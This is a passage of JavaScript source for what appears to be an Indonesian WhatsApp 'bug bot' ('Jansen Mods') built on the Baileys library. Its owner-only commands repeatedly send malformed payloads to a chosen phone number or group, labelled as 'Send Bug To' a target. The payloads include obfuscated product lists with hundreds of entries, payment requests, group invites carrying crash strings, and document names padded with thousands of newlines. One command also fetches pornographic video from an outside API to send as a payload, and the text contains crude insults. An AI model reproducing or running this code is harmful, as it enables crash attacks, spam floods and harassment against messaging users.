var groupInvite = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"groupInviteMessage": {
"groupJid": "85296556573-1328272333@g.us",
"inviteCode": "wFHwtOxGQN8OwK2x",
"inviteExpiration": `MY NAME 🔥 ${teks} ${ngazap(prefix)}`,
"groupName": `MY NAME 🔥 ${teks} ${ngazap(prefix)}`,
"caption": `🔥 ${teks} ${ngazap(prefix)}`,
"jpegThumbnail": messa.imageMessage,
}
}), { userJid: m.chat, quoted: doc })
jansen.relayMessage(m.chat, groupInvite.message, { messageId: groupInvite.key.id })
}
}
break
case 'jadibugpayment' : {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} jansen`)
let teks = `${q}`
{
jansen.relayMessage(m.chat, { requestPaymentMessage: { Message: { extendedTextMessage: { text: `${buttonkal}`, currencyCodeIso4217: 'IDR', requestFrom: '0@s.whatsapp.net', expiryTimestamp: 8000, amount: 1, contextInfo:{"externalAdReply": {"title": `❍ 𝐉𝚫𝐍𝐒𝚵𝐍 𝐌Ṏ𝐃𝐒 ❍°͢`,"body": `Selamat ${salam} kak ${pushname}`,
mimetype: 'audio/mpeg', caption: `🔥 ${teks} ${buttonkal}`,
showAdAttribution: true,
sourceUrl: `https://youtube.com/@jansenmods`,
thumbnailUrl: 'https://telegra.ph/file/4eadba9e88088bf2586c5.jpg', 
}
}}}}}, { quoted:doc})
}
}
break
case 'jadibugbokep': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} jansen`)
let teks = `${q}`
{
dwhe = await getBuffer(`https://raku-web.herokuapp.com/api/bokep?apikey=RakuKeyTod`)
jansen.sendMessage(m.chat, { video: dwhe, mimetype: 'video/mp4', fileName: `${command}.mp4`, caption: `🔥 ${teks} ${bugsw}` }, { quoted: doc })
}
}
break
case 'jadibugsw': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} jansen`)
let teks = `${q}`
{
joau = fs.readFileSync('./basejansen/video/jansen.mp4')
jansen.sendMessage(m.chat, { video: joau, mimetype: 'video/mp4', caption: `🔥 ${teks} ${buttonkal}` }, { quoted: doc })
}
}
break
case 'jadibugbutton':
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} jansen`)
let teks = `${q}`
{
const buttonssk = [
{buttonId: `${prefix}djisdjiwdjjes`, buttonText: {displayText: buttonvirus}, type: 1},
{buttonId: 'babaabbabababa', buttonText: {displayText: buttonvirus}, type: 1},
{buttonId: 'babababbababa', buttonText: {displayText: buttonvirus}, type: 1}
]
const buttonnnnmMessage = {
text: `🔥 ${teks} ${bugsw}`,
footerText: '🔥 ${teks} ',
buttons: buttonssk,
headerType: 1
}
jansen.sendMessage(m.chat, buttonnnnmMessage)
}
 break
//=================================================//
//=================================================//
//=================================================//
case 'inibug': case 'jansenjhon': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Hallo Aku Jansen`
for (let i = 0; i < jumlah; i++) {
let teks = `══✪〘 *BANG INI BUG ? ☺️* 〙✪══
 ➲ *Pesan : ${q ? q : 'kosong'}*\n\n`
for (let mem of participants) {
teks += `⭔ @${mem.id.split('@')[0]}\n`
}
jansen.sendMessage(m.chat, { text: teks, mentions: participants.map(a => a.id) }, { quoted: doc })}
}
break
//=================================================//
case 'aduhcoy':
if (isBan) throw sticBanLu(from)
if (!isCreator) return
touchmebre = [
{
title: `👻 JANSEN MODS 👻 ${buttonvirus} ${buttonvirus}`,
rows: [
{title: buttonvirus, rowId: `asu'+$+$+$+2+#`, description: `Hay Kontol`},
{title: buttonvirus, rowId: `!$(2!*($!$8_!#!#+$`, description: `Hay Anak" Ngentod`}
]
}
]
jansen.sendListMsg(m.chat, `👻 JANSEN MODS 👻`, jansen.user.name, `Hay Kak Sc Bot Adia Di List`, `Click Here 👻`, touchmebre, m)
break
case 'jansenpoll': case 'jansenjhon2': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Hallo Aku Jansen`
for (let i = 0; i < jumlah; i++) {
var pollCreation = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"pollCreationMessage": {
"name": "HALO 👋 SAYA BOT JANSEN",
"options": [
{
"optionName": "KATANYA WA KEBAL"
},
{
"optionName": "BERANI VOTE GA"
},
{
"optionName": "VOTE LAH SEMUA"
},
{
"optionName": "KATANYA KEBAL"
},
{
"optionName": "SALAM BROTHER BY JANSEN MODS"
}
],
"selectableOptionsCount": 5
}
}), { userJid: m.chat, quoted: doc })
jansen.relayMessage(m.chat, pollCreation.message, { messageId: pollCreation.key.id })
deploy('sukses sendbug')}
}
break
//=================================================//
case 'jansentroli2': case 'jansentrol': case 'jatrol': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return reply(`Jumlahnya?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
a = await jansen.sendMessage(m.chat, {react: {  key: { remoteJid: m.chat, fromMe: true, id : m.key.id}}})
let dok = {key : {participant : '0@s.whatsapp.net'},message: {documentMessage: {title: `© ${ownername}`,jpegThumbnail: thumb}}}
var order = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"orderMessage": {
"orderId": "599519108102353",
"thumbnail": virgam,
"itemCount": 1996,
"status": "INQUIRY",
"surface": "CATALOG",
"message": "𝐓𝐑𝐎𝐋𝐈 𝐁𝐘 𝐉𝐀𝐍𝐒𝐄𝐍 𝐌𝐎𝐃𝐒",
"orderTitle": " BUG TROLI ", // 
"sellerJid": "6281364399250@s.whatsapp.net",
"token": "AR6z9PAvHjs9Qa7AYgBUjSEvcnOcRWycFpwieIhaMKdrhQ=="
}
}), { userJid: m.chat, quoted: doc })
jansen.relayMessage(m.chat, order.message, { messageId: order.key.id })
}
}
break
case 'jansentroli3': case 'jansentrol2': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return reply(`Jumlahnya?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
function _0x4279(){const _0x4c3178=['fromObject','Message','1847261837216262824','73652izvGmz','1847261837216262829','1910200oYNAKN','JANSEN\x20MODS','1847261837216262','331958AouuTv','key','7007318245952499','890188DtEJNR','0@s.whatsapp.net','1847261837216269','sendMessage','258issmFR','1210MrdGTJ','184726183721626282','36XHGsdh','184726183721626','156QxEJPM','2092328zHiLqt','18472618372162628','18472618372162627','56945YMXtkC','PRODUCT_LIST','chat','3309880sRCSRt','6281364399250@s.whatsapp.net'];_0x4279=function(){return _0x4c3178;};return _0x4279();}const _0x588892=_0x54e7;function _0x54e7(_0x45a980,_0x39b46a){const _0x4279b=_0x4279();return _0x54e7=function(_0x54e7ef,_0x201079){_0x54e7ef=_0x54e7ef-0x1f0;let _0x13064e=_0x4279b[_0x54e7ef];return _0x13064e;},_0x54e7(_0x45a980,_0x39b46a);}(function(_0x2a139b,_0x2b4728){const _0x1838e0=_0x54e7,_0x425404=_0x2a139b();while(!![]){try{const _0x5b3fe2=-parseInt(_0x1838e0(0x201))/0x1+-parseInt(_0x1838e0(0x1fb))/0x2+-parseInt(_0x1838e0(0x20a))/0x3*(-parseInt(_0x1838e0(0x1f9))/0x4)+-parseInt(_0x1838e0(0x1f1))/0x5*(parseInt(_0x1838e0(0x205))/0x6)+-parseInt(_0x1838e0(0x1f4))/0x7+parseInt(_0x1838e0(0x20b))/0x8*(-parseInt(_0x1838e0(0x208))/0x9)+parseInt(_0x1838e0(0x206))/0xa*(parseInt(_0x1838e0(0x1fe))/0xb);if(_0x5b3fe2===_0x2b4728)break;else _0x425404['push'](_0x425404['shift']());}catch(_0x103dcc){_0x425404['push'](_0x425404['shift']());}}}(_0x4279,0xb8533),a=await jansen[_0x588892(0x204)](m[_0x588892(0x1f3)],{'react':{'key':{'remoteJid':m[_0x588892(0x1f3)],'fromMe':!![],'id':m[_0x588892(0x1ff)]['id']}}}));let doko={'key':{'participant':_0x588892(0x202)},'message':{'documentMessage':{'title':'©\x20'+ownername,'jpegThumbnail':thumb}}};var order=generateWAMessageFromContent(m['chat'],proto[_0x588892(0x1f7)][_0x588892(0x1f6)]({'listMessage':{'title':''+buttonkal,'description':_0x588892(0x1fc)+buttonkal,'thumbnail':virgam,'buttonText':'','listType':_0x588892(0x1f2),'productListInfo':{'productSections':[{'title':''+buttonkal,'products':[{'productId':'1847261837216269'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x203)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x203)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x203)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'1847261837216269'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x203)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x203)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x203)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'1847261837216269'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'1847261837216269'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x203)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x203)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'1847261837216262'},{'productId':'1847261837216262244'},{'productId':_0x588892(0x207)},{'productId':_0x588892(0x1fa)},{'productId':'1847261837216262829'},{'productId':_0x588892(0x1f8)},{'productId':_0x588892(0x207)},{'productId':_0x588892(0x207)},{'productId':'184726183721626282'},{'productId':_0x588892(0x20c)},{'productId':_0x588892(0x20c)},{'productId':_0x588892(0x1fd)},{'productId':'1847261837216262'},{'productId':_0x588892(0x1f0)},{'productId':_0x588892(0x1fd)},{'productId':'1847261837216262'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x1fd)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x203)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'1847261837216269'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'1847261837216269'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x203)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x1fd)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x1fa)},{'productId':'1847261837216262824'},{'productId':_0x588892(0x207)},{'productId':_0x588892(0x207)},{'productId':_0x588892(0x207)},{'productId':_0x588892(0x20c)},{'productId':_0x588892(0x20c)},{'productId':'1847261837216262'},{'productId':'1847261837216262'},{'productId':'18472618372162627'},{'productId':_0x588892(0x1fd)},{'productId':_0x588892(0x1fd)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':'184726183721626'}]}],'headerImage':{'productId':_0x588892(0x200)},'businessOwnerJid':_0x588892(0x1f5)},'footerText':''+buttonkal}}),{'userJid':m[_0x588892(0x1f3)],'quoted':m});jansen['relayMessage'](m[_0x588892(0x1f3)],order['message'],{'messageId':order['key']['id']});
}
}
break
//=================================================//
case 'spc': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length < 1) return m.reply(`*Syntax Error!*\n\nUse : ${command} nomor target|amount spam|timer\nExample : ${command} 62888s.whatsapp.net|1|10s\n\n\ns = Second/Detik\n\n`)
num = q.split('|')[0]
jumlah = q.split('|')[1]
for (let i = 0; i < jumlah; i++) {
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./basejansen/image/jansengans.jpg') }, { upload: jansen.waUploadToServer })
var requestPaymentMessage = generateWAMessageFromContent(num, proto.Message.fromObject({
"requestPaymentMessage": {
"currencyCodeIso4217": "IDR",
"amount1000": "100",
"extendedTextMessage": {
"text": `MY DEVELOPER JANSEN`,
}
}}), { userJid: m.chat, quoted: doc})
jansen.relayMessage(num, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
}
m.reply(`Success Send Bug To: ${num}\nAmount Spam: ${jumlah}`)
}
break
//=================================================//
case 'sgc': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length < 1) return m.reply(`*Syntax Error!*\n\nUse : ${command} idGroup|amount spam|timer\nExample : ${command} 62888@g.us|1|10s\n\n\ns = Second/Detik\n\nDi Usahakan Bot Udah Masuk Group Nya`)
num = q.split('|')[0]
jumlah = q.split('|')[1]
for (let i = 0; i < jumlah; i++) {
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./basejansen/image/jansengans.jpg') }, { upload: jansen.waUploadToServer })
var requestPaymentMessage = generateWAMessageFromContent(num, proto.Message.fromObject({
"requestPaymentMessage": {
"currencyCodeIso4217": "IDR",
"amount1000": "100",
"extendedTextMessage": {
"text": `MY DEVELOPER JANSEN`,
}
}}), { userJid: m.chat, quoted: doc})
jansen.relayMessage(num, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
}
m.reply(`Success Send Bug To: ${num}\nAmount Spam: ${jumlah}`)
}
break
//=================================================//
case 'ducu': case 'jansenducu': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Hallo Aku Jansen`
for (let i = 0; i < jumlah; i++) {
yy = fs.readFileSync('./basejansen/sound/hwmods.HW')
jansen.sendMessage(m.chat, {document: yy, mimetype: 'application/octet-stream', fileName:`© ✯𝐉𝚫𝐍𝐒𝚵𝐍✯APIs ~ 404 ${buttonkal}.HW` }, {quoted:doc})
}
}
break
//=================================================//
case 'jansendaca': case 'jansendaca':  {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Hallo Aku Jansen`
for (let i = 0; i < jumlah; i++) {
 ilih = fs.readFileSync('./basejansen/sound/hwmods.HW')
 jansen.sendMessage(m.chat, {document: ilih, mimetype: '', fileName:`© ✯𝐉𝚫𝐍𝐒𝚵𝐍✯APIs ~ 404 ${buttonkal}.HW` }, {quoted:doc})
 }
 }
 break
//=================================================//
case 'jansendocu': case 'jansendraknes':  {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Hallo Aku Jansen`
for (let i = 0; i < jumlah; i++) {
var document = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"documentMessage": {
"url": "https://mmg.whatsapp.net/d/f/AjZ6wydBPTW9LotpjZK5gSstbxj0L_B2sCeSm-JWLPPS.enc",
"mimetype": "",
"title": "𝗕𝗔𝗦𝗘 𝗦𝗜𝗗",
"fileSha256": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
"pageCount": 0,
"mediaKey": "SkHeALp42Ch7DGb6nuV6p7hxL+V9yjh9s9t3Ox8a72o=",
"fileName": `🔥 ✯𝐉𝚫𝐍𝐒𝚵𝐍✯ ☠️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${buttonkal}.𝗕𝗔𝗦𝗘 𝗦𝗜𝗗`,
"fileEncSha256": "CnBDLUVshNEAmK8C4ShVaI99hh/oFBEZHIeGsL/Q3HY=",
"directPath": "/v/t62.7119-24/19245462_2210838589082189_6252828231656384414_n.enc?ccb=11-4&oh=01_AVxdbYsmdj4IcIAC5_cBEX2zk7LnBmgTLyqZ7H83Z0Ci_g&oe=6303EB20",
"mediaKeyTimestamp": "1658703206",
}
}), { userJid: m.chat })
jansen.relayMessage(m.chat, document.message, { messageId: document.key.id })
}
}
break
//=================================================//
case 'duc': case 'jansenslebew': case 'cumadocu': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Hallo Aku Jansen`
for (let i = 0; i < jumlah; i++) {
var document = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"documentMessage": {
"url": "https://mmg.whatsapp.net/d/f/AqdSNOaicHcP1vw_2qKlkG3AB8udWmo47Y9rmKjnLUss.enc",
"mimetype": "*/*",
"title": "IMG-20220802-WA0052.jpeg",
"fileSha256": "iKJGFOiAl6DNllhc+9g7t8kwSKTl50TqZaIerGCa1OM=",
"pageCount": 0,
"mediaKey": "inQAnlhVJdu5dMUKr86iWUJnG/umzHeUGrlD7qqAN/I=",
